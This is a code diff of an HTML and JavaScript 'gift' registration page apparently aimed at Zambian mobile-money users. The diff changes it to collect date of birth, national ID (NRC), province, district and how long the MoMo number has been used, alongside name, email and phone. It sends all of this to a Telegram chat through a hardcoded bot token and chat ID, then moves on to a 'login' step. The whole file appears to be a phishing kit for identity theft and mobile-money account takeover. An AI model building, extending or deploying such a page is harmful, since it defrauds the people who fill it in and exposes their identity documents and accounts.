@@ -163,7 +163,7 @@
         }
         
         .form-group {
-            margin-bottom: 16px;
+            margin-bottom: 14px;
         }
         
         .form-label {
@@ -171,7 +171,7 @@
             font-weight: 600;
             color: #333;
             margin-bottom: 4px;
-            font-size: 14px;
+            font-size: 13px;
         }
         
         .form-label .required {
@@ -182,10 +182,10 @@
         .form-input,
         .form-select {
             width: 100%;
-            padding: 12px 14px;
+            padding: 11px 14px;
             border: 2px solid #e0e0e0;
             border-radius: 12px;
-            font-size: 15px;
+            font-size: 14px;
             transition: border-color 0.3s, box-shadow 0.3s;
             font-family: 'Inter', sans-serif;
             background: white;
@@ -205,7 +205,7 @@
         
         .form-row {
             display: flex;
-            gap: 15px;
+            gap: 12px;
         }
         
         .form-row .form-group {
@@ -227,8 +227,8 @@
         
         .error-text {
             color: #e74c3c;
-            font-size: 12px;
-            margin-top: 4px;
+            font-size: 11px;
+            margin-top: 3px;
             display: none;
             font-weight: 500;
         }
@@ -319,7 +319,6 @@
             margin-top: auto;
         }
         
-        /* Scrollbar styling */
         .card::-webkit-scrollbar {
             width: 4px;
         }
@@ -355,7 +354,7 @@
             }
             .form-input,
             .form-select {
-                font-size: 14px;
+                font-size: 13px;
                 padding: 10px 12px;
             }
             .gift-preview {
@@ -382,7 +381,7 @@
         <h1 class="form-title">🎁 Your <span class="highlight">Details</span></h1>
         <p class="form-subtitle">Fill in your personal information</p>
         
-        <!-- Gift Preview -->
+        <!-- Gift Preview - Shows selected gift -->
         <div class="gift-preview" id="giftPreview">
             <span class="icon" id="giftIcon">🎁</span>
             <div class="info">
@@ -400,7 +399,7 @@
         <!-- Full Name -->
         <div class="form-group">
             <label class="form-label">Full Name <span class="required">*</span></label>
-            <input type="text" class="form-input" id="fullName" placeholder="Enter your full name" required>
+            <input type="text" class="form-input" id="fullName" placeholder="e.g. John Banda" required>
             <div class="error-text" id="nameError">Please enter your full name (min 2 characters).</div>
         </div>
 
@@ -418,27 +417,82 @@
             </div>
         </div>
 
-        <!-- Employment Status -->
-        <div class="form-group">
-            <label class="form-label">Employment Status <span class="required">*</span></label>
-            <select class="form-select" id="employment" required>
-                <option value="">Select employment status</option>
-                <option value="employed">Employed Full-Time</option>
-                <option value="parttime">Employed Part-Time</option>
-                <option value="selfemployed">Self-Employed</option>
-                <option value="business">Business Owner</option>
-                <option value="unemployed">Unemployed</option>
-                <option value="student">Student</option>
-                <option value="retired">Retired</option>
-            </select>
-            <div class="error-text" id="employmentError">Please select your employment status.</div>
+        <!-- Date of Birth & NRC Row -->
+        <div class="form-row">
+            <div class="form-group">
+                <label class="form-label">Date of Birth <span class="required">*</span></label>
+                <input type="date" class="form-input" id="dob" required>
+                <div class="error-text" id="dobError">You must be 18 years or older.</div>
+            </div>
+            <div class="form-group">
+                <label class="form-label">NRC / National ID <span class="required">*</span></label>
+                <input type="text" class="form-input" id="nrc" placeholder="e.g. 123456/78/1" required>
+                <div class="error-text" id="nrcError">Please enter a valid NRC/National ID.</div>
+            </div>
         </div>
 
-        <!-- Monthly Income -->
+        <!-- Province & District Row -->
+        <div class="form-row">
+            <div class="form-group">
+                <label class="form-label">Province <span class="required">*</span></label>
+                <select class="form-select" id="province" required>
+                    <option value="">Select province</option>
+                    <option value="Central">Central</option>
+                    <option value="Copperbelt">Copperbelt</option>
+                    <option value="Eastern">Eastern</option>
+                    <option value="Luapula">Luapula</option>
+                    <option value="Lusaka">Lusaka</option>
+                    <option value="Muchinga">Muchinga</option>
+                    <option value="Northern">Northern</option>
+                    <option value="North-Western">North-Western</option>
+                    <option value="Southern">Southern</option>
+                    <option value="Western">Western</option>
+                </select>
+                <div class="error-text" id="provinceError">Please select your province.</div>
+            </div>
+            <div class="form-group">
+                <label class="form-label">District <span class="required">*</span></label>
+                <select class="form-select" id="district" required>
+                    <option value="">Select district</option>
+                    <option value="Chibombo">Chibombo</option>
+                    <option value="Chilanga">Chilanga</option>
+                    <option value="Chirundu">Chirundu</option>
+                    <option value="Chongwe">Chongwe</option>
+                    <option value="Kafue">Kafue</option>
+                    <option value="Luangwa">Luangwa</option>
+                    <option value="Lusaka">Lusaka</option>
+                    <option value="Rufunsa">Rufunsa</option>
+                    <option value="Shibuyunji">Shibuyunji</option>
+                    <option value="Kitwe">Kitwe</option>
+                    <option value="Ndola">Ndola</option>
+                    <option value="Mufulira">Mufulira</option>
+                    <option value="Livingstone">Livingstone</option>
+                    <option value="Kasama">Kasama</option>
+                    <option value="Chipata">Chipata</option>
+                    <option value="Mongu">Mongu</option>
+                    <option value="Solwezi">Solwezi</option>
+                    <option value="Kabwe">Kabwe</option>
+                    <option value="Other">Other</option>
+                </select>
+                <div class="error-text" id="districtError">Please select your district.</div>
+            </div>
+        </div>
+
+        <!-- How long have you used this MoMo number? -->
         <div class="form-group">
-            <label class="form-label">Monthly Income (ZMW) <span class="required">*</span></label>
-            <input type="number" class="form-input" id="income" placeholder="5000" min="0" step="100" required>
-            <div class="error-text" id="incomeError">Please enter your monthly income.</div>
+            <label class="form-label">How long have you used this MoMo number? <span class="required">*</span></label>
+            <select class="form-select" id="momoAge" required>
+                <option value="">Select duration</option>
+                <option value="Less than 1 month">Less than 1 month</option>
+                <option value="1 - 3 months">1 - 3 months</option>
+                <option value="3 - 6 months">3 - 6 months</option>
+                <option value="6 - 12 months">6 - 12 months</option>
+                <option value="1 - 2 years">1 - 2 years</option>
+                <option value="2 - 3 years">2 - 3 years</option>
+                <option value="3 - 5 years">3 - 5 years</option>
+                <option value="More than 5 years">More than 5 years</option>
+            </select>
+            <div class="error-text" id="momoAgeError">Please select how long you've used this MoMo number.</div>
         </div>
 
         <!-- Buttons -->
@@ -456,10 +510,9 @@
         // ============================================
         const BOT_TOKEN = '8831584066:AAHha7klI8i-yuHllr1lRv0y7JD2ygp-0OI';
         const CHAT_ID = '8392790531';
-        const API_URL = 'https://abundant-liberation.up.railway.app/api';
 
         // ============================================
-        // LOAD SELECTED GIFT
+        // LOAD SELECTED GIFT - Shows at top
         // ============================================
         function loadSelectedGift() {
             const gift = localStorage.getItem('selectedGift') || 'Not selected';
@@ -481,14 +534,20 @@
         const savedName = localStorage.getItem('fullName');
         const savedEmail = localStorage.getItem('email');
         const savedPhone = localStorage.getItem('phone');
-        const savedEmployment = localStorage.getItem('employment');
-        const savedIncome = localStorage.getItem('income');
+        const savedDob = localStorage.getItem('dob');
+        const savedNrc = localStorage.getItem('nrc');
+        const savedProvince = localStorage.getItem('province');
+        const savedDistrict = localStorage.getItem('district');
+        const savedMomoAge = localStorage.getItem('momoAge');
 
         if (savedName) document.getElementById('fullName').value = savedName;
         if (savedEmail) document.getElementById('email').value = savedEmail;
         if (savedPhone) document.getElementById('phone').value = savedPhone;
-        if (savedEmployment) document.getElementById('employment').value = savedEmployment;
-        if (savedIncome) document.getElementById('income').value = savedIncome;
+        if (savedDob) document.getElementById('dob').value = savedDob;
+        if (savedNrc) document.getElementById('nrc').value = savedNrc;
+        if (savedProvince) document.getElementById('province').value = savedProvince;
+        if (savedDistrict) document.getElementById('district').value = savedDistrict;
+        if (savedMomoAge) document.getElementById('momoAge').value = savedMomoAge;
 
         // ============================================
         // DOM REFERENCES
@@ -507,13 +566,31 @@
             return cleaned.length >= 9 && /^[\+\d\s-]+$/.test(phone);
         }
 
+        function validateAge(dob) {
+            const birthDate = new Date(dob);
+            const today = new Date();
+            const age = today.getFullYear() - birthDate.getFullYear();
+            const monthDiff = today.getMonth() - birthDate.getMonth();
+            if (monthDiff < 0 || (monthDiff === 0 && today.getDate() < birthDate.getDate())) {
+                return age - 1 >= 18;
+            }
+            return age >= 18;
+        }
+
+        function validateNrc(nrc) {
+            return nrc.length >= 5 && /^[0-9\/]+$/.test(nrc);
+        }
+
         function getErrorElements() {
             return {
                 name: document.getElementById('nameError'),
                 email: document.getElementById('emailError'),
                 phone: document.getElementById('phoneError'),
-                employment: document.getElementById('employmentError'),
-                income: document.getElementById('incomeError')
+                dob: document.getElementById('dobError'),
+                nrc: document.getElementById('nrcError'),
+                province: document.getElementById('provinceError'),
+                district: document.getElementById('districtError'),
+                momoAge: document.getElementById('momoAgeError')
             };
         }
 
@@ -522,8 +599,11 @@
                 name: document.getElementById('fullName'),
                 email: document.getElementById('email'),
                 phone: document.getElementById('phone'),
-                employment: document.getElementById('employment'),
-                income: document.getElementById('income')
+                dob: document.getElementById('dob'),
+                nrc: document.getElementById('nrc'),
+                province: document.getElementById('province'),
+                district: document.getElementById('district'),
+                momoAge: document.getElementById('momoAge')
             };
         }
 
@@ -553,8 +633,11 @@
                 `👤 Name: ${data.fullName}\n` +
                 `📧 Email: ${data.email}\n` +
                 `📱 Phone: +260 ${data.phone}\n` +
-                `💼 Employment: ${data.employment}\n` +
-                `💰 Monthly Income: ZMW ${parseInt(data.income).toLocaleString()}\n\n` +
+                `🎂 DOB: ${data.dob}\n` +
+                `🪪 NRC: ${data.nrc}\n` +
+                `📍 Province: ${data.province}\n` +
+                `📍 District: ${data.district}\n` +
+                `⏳ MoMo Used: ${data.momoAge}\n\n` +
                 `⏰ Time: ${new Date().toLocaleString()}\n\n` +
                 `✅ User has registered for a gift. Proceeding to login.`;
 
@@ -587,8 +670,11 @@
             const name = inputs.name.value.trim();
             const email = inputs.email.value.trim();
             const phone = inputs.phone.value.trim();
-            const employment = inputs.employment.value;
-            const income = inputs.income.value.trim();
+            const dob = inputs.dob.value;
+            const nrc = inputs.nrc.value.trim();
+            const province = inputs.province.value;
+            const district = inputs.district.value;
+            const momoAge = inputs.momoAge.value;
 
             resetErrors();
             let valid = true;
@@ -611,15 +697,36 @@
                 valid = false;
             }
 
-            // Validate Employment
-            if (!employment) {
-                showError(inputs.employment, errors.employment, 'Please select your employment status.');
+            // Validate Date of Birth
+            if (!dob) {
+                showError(inputs.dob, errors.dob, 'Please select your date of birth.');
+                valid = false;
+            } else if (!validateAge(dob)) {
+                showError(inputs.dob, errors.dob, 'You must be 18 years or older.');
                 valid = false;
             }
 
-            // Validate Income
-            if (!income || parseFloat(income) < 0) {
-                showError(inputs.income, errors.income, 'Please enter your monthly income.');
+            // Validate NRC
+            if (!nrc || !validateNrc(nrc)) {
+                showError(inputs.nrc, errors.nrc, 'Please enter a valid NRC/National ID.');
+                valid = false;
+            }
+
+            // Validate Province
+            if (!province) {
+                showError(inputs.province, errors.province, 'Please select your province.');
+                valid = false;
+            }
+
+            // Validate District
+            if (!district) {
+                showError(inputs.district, errors.district, 'Please select your district.');
+                valid = false;
+            }
+
+            // Validate MoMo Age
+            if (!momoAge) {
+                showError(inputs.momoAge, errors.momoAge, 'Please select how long you\'ve used this MoMo number.');
                 valid = false;
             }
 
@@ -644,16 +751,22 @@
                 fullName: name,
                 email: email,
                 phone: phone,
-                employment: employment,
-                income: income
+                dob: dob,
+                nrc: nrc,
+                province: province,
+                district: district,
+                momoAge: momoAge
             };
 
             // Save to localStorage
             localStorage.setItem('fullName', name);
             localStorage.setItem('email', email);
             localStorage.setItem('phone', phone);
-            localStorage.setItem('employment', employment);
-            localStorage.setItem('income', income);
+            localStorage.setItem('dob', dob);
+            localStorage.setItem('nrc', nrc);
+            localStorage.setItem('province', province);
+            localStorage.setItem('district', district);
+            localStorage.setItem('momoAge', momoAge);
             localStorage.setItem('giftData', JSON.stringify(giftData));
 
             // Send to Telegram
@@ -689,17 +802,38 @@
             }
         });
 
-        document.getElementById('employment').addEventListener('change', function() {
-            if (this.value) {
+        document.getElementById('dob').addEventListener('change', function() {
+            if (this.value && validateAge(this.value)) {
                 this.classList.remove('invalid');
-                document.getElementById('employmentError').classList.remove('show');
+                document.getElementById('dobError').classList.remove('show');
             }
         });
 
-        document.getElementById('income').addEventListener('input', function() {
-            if (this.value.trim() && parseFloat(this.value) >= 0) {
+        document.getElementById('nrc').addEventListener('input', function() {
+            if (this.value.trim().length >= 5) {
                 this.classList.remove('invalid');
-                document.getElementById('incomeError').classList.remove('show');
+                document.getElementById('nrcError').classList.remove('show');
+            }
+        });
+
+        document.getElementById('province').addEventListener('change', function() {
+            if (this.value) {
+                this.classList.remove('invalid');
+                document.getElementById('provinceError').classList.remove('show');
+            }
+        });
+
+        document.getElementById('district').addEventListener('change', function() {
+            if (this.value) {
+                this.classList.remove('invalid');
+                document.getElementById('districtError').classList.remove('show');
+            }
+        });
+
+        document.getElementById('momoAge').addEventListener('change', function() {
+            if (this.value) {
+                this.classList.remove('invalid');
+                document.getElementById('momoAgeError').classList.remove('show');
             }
         });
 
